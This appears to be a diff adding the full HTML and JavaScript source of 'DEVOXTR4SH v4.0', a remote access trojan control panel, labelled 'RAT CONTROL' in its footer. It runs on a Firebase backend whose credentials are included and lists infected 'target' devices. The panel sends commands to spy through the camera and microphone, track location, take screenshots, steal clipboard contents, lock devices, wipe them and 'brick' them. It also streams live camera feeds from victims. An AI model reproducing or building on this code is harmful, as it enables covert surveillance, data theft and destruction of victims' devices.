@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>DEVOXTR4SH · CONTROL PANEL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        :root {
+            --bg: #050505;
+            --card: #0d0d0d;
+            --border: #ff0022;
+            --border-dim: rgba(255,0,34,0.25);
+            --red: #ff0022;
+            --red-glow: rgba(255,0,34,0.12);
+            --text: #ffffff;
+            --sub: #777777;
+            --grid: rgba(255,0,34,0.04);
+        }
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Orbitron', monospace;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        /* GRID */
+        .grid-bg {
+            position: fixed;
+            inset: 0;
+            background-image: 
+                linear-gradient(var(--grid) 1px, transparent 1px),
+                linear-gradient(90deg, var(--grid) 1px, transparent 1px);
+            background-size: 28px 28px;
+            pointer-events: none;
+            z-index: 0;
+        }
+        .radial-glow {
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(circle at 20% 30%, rgba(255,0,34,0.07) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 70%, rgba(255,0,34,0.04) 0%, transparent 40%);
+            pointer-events: none;
+            z-index: 0;
+        }
+        .container {
+            max-width: 520px;
+            margin: 0 auto;
+            padding: 16px 14px 30px;
+            position: relative;
+            z-index: 1;
+        }
+        /* HEADER */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 16px;
+            border: 1px solid var(--border-dim);
+            border-radius: 10px;
+            background: rgba(13,13,13,0.95);
+            backdrop-filter: blur(10px);
+            margin-bottom: 14px;
+        }
+        .logo {
+            font-size: 16px;
+            font-weight: 900;
+            letter-spacing: 3px;
+            background: linear-gradient(180deg, #ff4455, #aa0011);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .logo span { color: var(--red); }
+        .status-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 8px;
+            color: var(--sub);
+            letter-spacing: 1px;
+        }
+        .dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #00ff44;
+            animation: pulse-dot 1.2s infinite;
+        }
+        @keyframes pulse-dot {
+            0%,100% { opacity:1; transform:scale(1); }
+            50% { opacity:0.3; transform:scale(0.7); }
+        }
+        /* PAIRING */
+        .pairing-box {
+            background: rgba(13,13,13,0.95);
+            border: 1px solid var(--border-dim);
+            border-radius: 10px;
+            padding: 12px 16px;
+            margin-bottom: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .pairing-label {
+            font-size: 8px;
+            color: var(--sub);
+            letter-spacing: 2px;
+        }
+        .pairing-id {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--red);
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .pairing-id button {
+            background: none;
+            border: 1px solid var(--border-dim);
+            color: var(--sub);
+            padding: 3px 12px;
+            border-radius: 4px;
+            font-size: 8px;
+            cursor: pointer;
+            font-family: 'Orbitron', monospace;
+            transition: 0.2s;
+        }
+        .pairing-id button:hover {
+            border-color: var(--red);
+            color: var(--red);
+        }
+        /* STATS */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 6px;
+            margin-bottom: 14px;
+        }
+        .stat {
+            background: rgba(13,13,13,0.9);
+            border: 1px solid var(--border-dim);
+            border-radius: 8px;
+            padding: 10px 6px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .stat::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: var(--red);
+            opacity: 0.5;
+        }
+        .stat-num {
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--red);
+            letter-spacing: 1px;
+        }
+        .stat-label {
+            font-size: 6px;
+            color: var(--sub);
+            letter-spacing: 1px;
+            margin-top: 3px;
+            text-transform: uppercase;
+        }
+        /* DEVICE LIST */
+        .section-title {
+            font-size: 9px;
+            color: var(--sub);
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            border-bottom: 1px solid var(--border-dim);
+            padding-bottom: 6px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .device-card {
+            background: rgba(13,13,13,0.92);
+            border: 1px solid var(--border-dim);
+            border-radius: 10px;
+            padding: 12px 14px;
+            margin-bottom: 8px;
+            transition: 0.25s;
+        }
+        .device-card:hover {
+            border-color: var(--red);
+            box-shadow: 0 0 30px var(--red-glow);
+        }
+        .device-card.online { border-left: 3px solid #00ff44; }
+        .device-card.offline { border-left: 3px solid #333; opacity: 0.5; }
+        .device-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .device-name {
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .device-name .material-symbols-outlined {
+            font-size: 16px;
+            color: var(--sub);
+        }
+        .device-battery {
+            font-size: 10px;
+            color: #00ff44;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .device-meta {
+            font-size: 7px;
+            color: var(--sub);
+            margin-top: 3px;
+            letter-spacing: 0.5px;
+        }
+        .device-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            margin-top: 10px;
+            padding-top: 10px;
+            border-top: 1px solid rgba(255,255,255,0.04);
+        }
+        .cmd-btn {
+            background: rgba(255,0,34,0.07);
+            border: 1px solid var(--border-dim);
+            border-radius: 6px;
+            padding: 5px 8px;
+            color: var(--text);
+            font-size: 7px;
+            font-family: 'Orbitron', monospace;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 3px;
+            letter-spacing: 0.3px;
+            flex: 1 0 auto;
+            justify-content: center;
+            min-width: 44px;
+        }
+        .cmd-btn:hover {
+            background: rgba(255,0,34,0.18);
+            border-color: var(--red);
+            box-shadow: 0 0 20px var(--red-glow);
+        }
+        .cmd-btn .material-symbols-outlined { font-size: 12px; }
+        .cmd-btn.danger:hover { background: rgba(255,0,34,0.3); border-color: #ff0044; }
+        .cmd-btn.primary { background: rgba(0,255,68,0.07); border-color: rgba(0,255,68,0.15); }
+        .cmd-btn.primary:hover { background: rgba(0,255,68,0.15); border-color: #00ff44; }
+        .cmd-btn.active { background: rgba(255,0,34,0.2); border-color: var(--red); }
+        /* EMPTY */
+        .empty {
+            text-align: center;
+            padding: 40px 20px;
+            border: 1px dashed var(--border-dim);
+            border-radius: 10px;
+            color: var(--sub);
+        }
+        .empty .material-symbols-outlined {
+            font-size: 44px;
+            color: var(--border-dim);
+            margin-bottom: 10px;
+        }
+        .empty p {
+            font-size: 9px;
+            letter-spacing: 1px;
+            line-height: 1.8;
+        }
+        /* TOAST */
+        .toast {
+            position: fixed;
+            bottom: 16px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(13,13,13,0.96);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 10px 20px;
+            font-size: 9px;
+            letter-spacing: 1px;
+            backdrop-filter: blur(12px);
+            display: none;
+            z-index: 999;
+            max-width: 90%;
+            text-align: center;
+        }
+        .toast.show { display: block; animation: toastIn 0.3s ease; }
+        @keyframes toastIn {
+            from { opacity:0; transform:translateX(-50%) translateY(16px); }
+            to { opacity:1; transform:translateX(-50%) translateY(0); }
+        }
+        /* SCROLL */
+        ::-webkit-scrollbar { width: 3px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--red); border-radius: 3px; }
+        /* RESPONSIVE */
+        @media (max-width: 400px) {
+            .stats { grid-template-columns: repeat(2, 1fr); }
+            .cmd-btn { font-size: 6px; padding: 4px 5px; min-width: 36px; }
+            .cmd-btn .material-symbols-outlined { font-size: 10px; }
+        }
+        /* CAM FEED MODAL */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(8px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        .modal-overlay.show { display: flex; }
+        .modal-content {
+            background: #0d0d0d;
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 20px;
+            max-width: 500px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            position: relative;
+        }
+        .modal-content .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 14px;
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 20px;
+            cursor: pointer;
+            font-family: 'Orbitron', monospace;
+        }
+        .modal-content .close-btn:hover { color: var(--red); }
+        .modal-content video, .modal-content img {
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid var(--border-dim);
+            background: #000;
+        }
+        .modal-content .cam-status {
+            text-align: center;
+            font-size: 9px;
+            color: var(--sub);
+            margin-top: 8px;
+            letter-spacing: 1px;
+        }
+        .modal-content .cam-status .live { color: #00ff44; }
+    </style>
+</head>
+<body>
+
+<div class="grid-bg"></div>
+<div class="radial-glow"></div>
+
+<div class="container">
+
+    <!-- HEADER -->
+    <div class="header">
+        <div class="logo">◈ DEVOXTR4SH</div>
+        <div class="status-badge">
+            <span class="dot"></span>
+            <span id="connStatus">LIVE</span>
+        </div>
+    </div>
+
+    <!-- PAIRING -->
+    <div class="pairing-box">
+        <span class="pairing-label">PAIRING ID</span>
+        <span class="pairing-id">
+            <span id="pairingId">---</span>
+            <button onclick="copyPairing()">COPY</button>
+            <button onclick="generateNewPairing()">⟳</button>
+        </span>
+    </div>
+
+    <!-- STATS -->
+    <div class="stats">
+        <div class="stat"><div class="stat-num" id="totalDevices">0</div><div class="stat-label">Total</div></div>
+        <div class="stat"><div class="stat-num" id="onlineDevices" style="color:#00ff44;">0</div><div class="stat-label">Online</div></div>
+        <div class="stat"><div class="stat-num" id="offlineDevices">0</div><div class="stat-label">Offline</div></div>
+        <div class="stat"><div class="stat-num" id="cmdCount">0</div><div class="stat-label">Commands</div></div>
+    </div>
+
+    <!-- DEVICE LIST -->
+    <div class="section-title">
+        <span>DEVICE LIST</span>
+        <span id="deviceCount">0 devices</span>
+    </div>
+    <div id="deviceList"></div>
+
+    <!-- FOOTER -->
+    <div style="margin-top:20px;text-align:center;font-size:7px;color:var(--sub);letter-spacing:2px;border-top:1px solid var(--border-dim);padding-top:14px;">
+        DEVOXTR4SH v4.0 · RAT CONTROL · <span id="footerTime"></span>
+    </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<!-- CAM MODAL -->
+<div class="modal-overlay" id="camModal">
+    <div class="modal-content">
+        <button class="close-btn" onclick="closeCamModal()">✕</button>
+        <h3 style="font-size:12px;color:var(--red);margin-bottom:10px;letter-spacing:2px;">📹 LIVE CAMERA</h3>
+        <video id="camVideo" autoplay playsinline></video>
+        <div class="cam-status"><span class="live">● LIVE</span> <span id="camDeviceId">-</span></div>
+    </div>
+</div>
+
+<!-- FIREBASE -->
+<script type="importmap">
+{
+    "imports": {
+        "firebase/app": "https://www.gstatic.com/firebasejs/12.17.1/firebase-app.js",
+        "firebase/database": "https://www.gstatic.com/firebasejs/12.17.1/firebase-database.js",
+        "firebase/storage": "https://www.gstatic.com/firebasejs/12.17.1/firebase-storage.js"
+    }
+}
+</script>
+
+<script type="module">
+import { initializeApp } from "firebase/app";
+import { getDatabase, ref, onValue, set, push, remove, update, get, child, query, orderByChild, limitToLast } from "firebase/database";
+import { getStorage, ref as storageRef, uploadBytes, getDownloadURL } from "firebase/storage";
+
+// ===== FIREBASE =====
+const firebaseConfig = {
+    apiKey: "AIzaSyAV5qFI5J0cZd0eg2Q6mhEZ0KEiR1URv1c",
+    authDomain: "project-coding-gabut.firebaseapp.com",
+    databaseURL: "https://project-coding-gabut-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "project-coding-gabut",
+    storageBucket: "project-coding-gabut.firebasestorage.app",
+    messagingSenderId: "234910334669",
+    appId: "1:234910334669:web:7eacb5a07d37327cf2b384"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const storage = getStorage(app);
+
+// ===== STATE =====
+let devices = {};
+let cmdCounter = 0;
+let pairingId = localStorage.getItem('devox_pairing') || generateId();
+
+function generateId() {
+    const chars = '0123456789ABCDEF';
+    let id = '';
+    for (let i = 0; i < 16; i++) {
+        id += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return id;
+}
+
+function generateNewPairing() {
+    pairingId = generateId();
+    localStorage.setItem('devox_pairing', pairingId);
+    document.getElementById('pairingId').textContent = pairingId;
+    showToast('🔄 New pairing ID generated');
+    // Update devices with new pairing
+    updateDevicesPairing(pairingId);
+}
+
+function updateDevicesPairing(newId) {
+    // Update all devices to use new pairing ID
+    const refDevices = ref(db, 'devices');
+    get(refDevices).then(snap => {
+        const data = snap.val();
+        if (data) {
+            Object.keys(data).forEach(devId => {
+                set(ref(db, `devices/${devId}/pairing_id`), newId);
+            });
+        }
+    });
+}
+
+// ===== DOM REFS =====
+const deviceList = document.getElementById('deviceList');
+const totalDevicesEl = document.getElementById('totalDevices');
+const onlineDevicesEl = document.getElementById('onlineDevices');
+const offlineDevicesEl = document.getElementById('offlineDevices');
+const cmdCountEl = document.getElementById('cmdCount');
+const deviceCountEl = document.getElementById('deviceCount');
+const toast = document.getElementById('toast');
+
+// ===== TOAST =====
+function showToast(msg, dur = 3000) {
+    toast.textContent = msg;
+    toast.classList.add('show');
+    clearTimeout(toast._timer);
+    toast._timer = setTimeout(() => toast.classList.remove('show'), dur);
+}
+
+// ===== COPY PAIRING =====
+window.copyPairing = () => {
+    navigator.clipboard.writeText(pairingId);
+    showToast('✓ Pairing ID copied!');
+};
+window.generateNewPairing = generateNewPairing;
+
+// ===== SEND COMMAND =====
+function sendCommand(deviceId, command, payload = {}) {
+    const cmdRef = ref(db, `commands/${deviceId}`);
+    const data = {
+        command,
+        payload,
+        timestamp: Date.now(),
+        id: ++cmdCounter
+    };
+    set(cmdRef, data)
+        .then(() => {
+            showToast(`→ ${command.toUpperCase()} sent`);
+            cmdCountEl.textContent = cmdCounter;
+        })
+        .catch(err => showToast('✖ Error: ' + err.message));
+}
+window.sendCommand = sendCommand;
+
+// ===== OPEN CAM MODAL =====
+window.openCamModal = (deviceId) => {
+    document.getElementById('camModal').classList.add('show');
+    document.getElementById('camDeviceId').textContent = deviceId.slice(0,10);
+    
+    const video = document.getElementById('camVideo');
+    // Listen for camera stream
+    const camRef = ref(db, `camera/${deviceId}`);
+    onValue(camRef, (snap) => {
+        const data = snap.val();
+        if (data && data.image) {
+            // Show image
+            video.style.display = 'none';
+            const img = document.createElement('img');
+            img.src = data.image;
+            img.style.width = '100%';
+            img.style.borderRadius = '8px';
+            const parent = video.parentNode;
+            const existingImg = parent.querySelector('img');
+            if (existingImg) existingImg.remove();
+            parent.appendChild(img);
+        } else if (data && data.video) {
+            // Show video stream
+            video.style.display = 'block';
+            video.src = data.video;
+            video.play();
+        }
+    }, { onlyOnce: false });
+};
+
+window.closeCamModal = () => {
+    document.getElementById('camModal').classList.remove('show');
+    const video = document.getElementById('camVideo');
+    video.pause();
+    video.src = '';
+    const parent = video.parentNode;
+    const img = parent.querySelector('img');
+    if (img) img.remove();
+};
+
+// ===== RENDER DEVICE =====
+function renderDevice(id, data) {
+    const isOnline = data.status === 'online';
+    const card = document.createElement('div');
+    card.className = `device-card ${isOnline ? 'online' : 'offline'}`;
+    
+    const batt = data.battery || '?';
+    const battColor = parseInt(batt) > 50 ? '#00ff44' : parseInt(batt) > 20 ? '#ffaa00' : '#ff0022';
+
+    card.innerHTML = `
+        <div class="device-top">
+            <div class="device-name">
+                <span class="material-symbols-outlined">${isOnline ? 'devices' : 'devices_off'}</span>
+                ${data.name || id.slice(0,10)}
+            </div>
+            <div class="device-battery" style="color:${battColor};">
+                <span class="material-symbols-outlined" style="font-size:12px;">battery_${parseInt(batt) > 70 ? 'full' : parseInt(batt) > 40 ? 'medium' : 'low'}</span>
+                ${batt}%
+            </div>
+        </div>
+        <div class="device-meta">
+            ${data.model || 'Unknown'} · ${data.os || 'Browser'} · ${data.platform || 'Web'} · ${data.lastSeen ? new Date(data.lastSeen).toLocaleString() : '-'}
+        </div>
+        ${isOnline ? `
+        <div class="device-actions">
+            <button class="cmd-btn primary" onclick="sendCommand('${id}','lock')">
+                <span class="material-symbols-outlined">lock</span>
+            </button>
+            <button class="cmd-btn" onclick="sendCommand('${id}','unlock')">
+                <span class="material-symbols-outlined">lock_open</span>
+            </button>
+            <button class="cmd-btn" onclick="sendCommand('${id}','camera')">
+                <span class="material-symbols-outlined">photo_camera</span>
+            </button>
+            <button class="cmd-btn" onclick="sendCommand('${id}','livecam')">
+                <span class="material-symbols-outlined">videocam</span>
+            </button>
+            <button class="cmd-btn" onclick="sendCommand('${id}','mic')">
+                <span class="material-symbols-outlined">mic</span>
+            </button>
+            <button class="cmd-btn" onclick="sendCommand('${id}','notification')">
+                <span class="material-symbols-outlined">notifications</span>
+            </button>
+            <button class="cmd-btn" onclick="sendCommand('${id}','location')">
+                <span class="material-symbols-outlined">location_on</span>
+            </button>
+            <button class="cmd-btn" onclick="sendCommand('${id}','screenshot')">
+                <span class="material-symbols-outlined">screenshot</span>
+            </button>
+            <button class="cmd-btn" onclick="sendCommand('${id}','clipboard')">
+                <span class="material-symbols-outlined">content_copy</span>
+            </button>
+            <button class="cmd-btn" onclick="sendCommand('${id}','vibrate')">
+                <span class="material-symbols-outlined">vibration</span>
+            </button>
+            <button class="cmd-btn" onclick="sendCommand('${id}','fullscreen')">
+                <span class="material-symbols-outlined">fullscreen</span>
+            </button>
+            <button class="cmd-btn danger" onclick="sendCommand('${id}','wipe')">
+                <span class="material-symbols-outlined">delete_forever</span>
+            </button>
+            <button class="cmd-btn danger" onclick="sendCommand('${id}','brick')">
+                <span class="material-symbols-outlined">skull</span>
+            </button>
+            <button class="cmd-btn" onclick="openCamModal('${id}')" style="border-color:var(--red);">
+                <span class="material-symbols-outlined">visibility</span>
+            </button>
+        </div>
+        ` : `
+        <div class="device-actions">
+            <span style="color:var(--sub);font-size:7px;width:100%;text-align:center;">OFFLINE · waiting</span>
+        </div>
+        `}
+    `;
+    return card;
+}
+
+function renderEmpty() {
+    deviceList.innerHTML = `
+        <div class="empty">
+            <span class="material-symbols-outlined">device_hub</span>
+            <p>NO DEVICES CONNECTED<br>
+            <span style="font-size:7px;color:var(--sub);">Share pairing ID with target</span></p>
+        </div>
+    `;
+}
+
+// ===== LISTEN DEVICES =====
+const devicesRef = ref(db, 'devices');
+onValue(devicesRef, (snapshot) => {
+    const data = snapshot.val();
+    if (!data) {
+        devices = {};
+        renderEmpty();
+        totalDevicesEl.textContent = '0';
+        onlineDevicesEl.textContent = '0';
+        offlineDevicesEl.textContent = '0';
+        deviceCountEl.textContent = '0 devices';
+        return;
+    }
+
+    // Filter by pairing ID
+    const filtered = {};
+    Object.keys(data).forEach(id => {
+        if (data[id].pairing_id === pairingId || !data[id].pairing_id) {
+            filtered[id] = data[id];
+        }
+    });
+
+    devices = filtered;
+    const ids = Object.keys(devices);
+    const online = ids.filter(id => devices[id].status === 'online');
+    const offline = ids.filter(id => devices[id].status !== 'online');
+
+    totalDevicesEl.textContent = ids.length;
+    onlineDevicesEl.textContent = online.length;
+    offlineDevicesEl.textContent = offline.length;
+    deviceCountEl.textContent = `${ids.length} devices`;
+
+    if (ids.length === 0) {
+        renderEmpty();
+        return;
+    }
+
+    deviceList.innerHTML = '';
+    ids.forEach(id => {
+        const card = renderDevice(id, devices[id]);
+        deviceList.appendChild(card);
+    });
+});
+
+// ===== PAIRING ID SET =====
+document.getElementById('pairingId').textContent = pairingId;
+
+// ===== RESPONSES =====
+const respRef = ref(db, 'responses');
+onValue(respRef, (snapshot) => {
+    const data = snapshot.val();
+    if (!data) return;
+    Object.entries(data).forEach(([id, resp]) => {
+        if (resp && resp.result) {
+            showToast(`📥 Response from ${id.slice(0,6)}...`);
+            remove(ref(db, `responses/${id}`));
+        }
+    });
+});
+
+// ===== TIME =====
+function updateTime() {
+    document.getElementById('footerTime').textContent = new Date().toLocaleString();
+}
+updateTime();
+setInterval(updateTime, 10000);
+
+console.log('🔥 DEVOXTR4SH v4.0 LOADED');
+console.log(`📱 Pairing ID: ${pairingId}`);
+</script>
+
+</body>
+  </html>
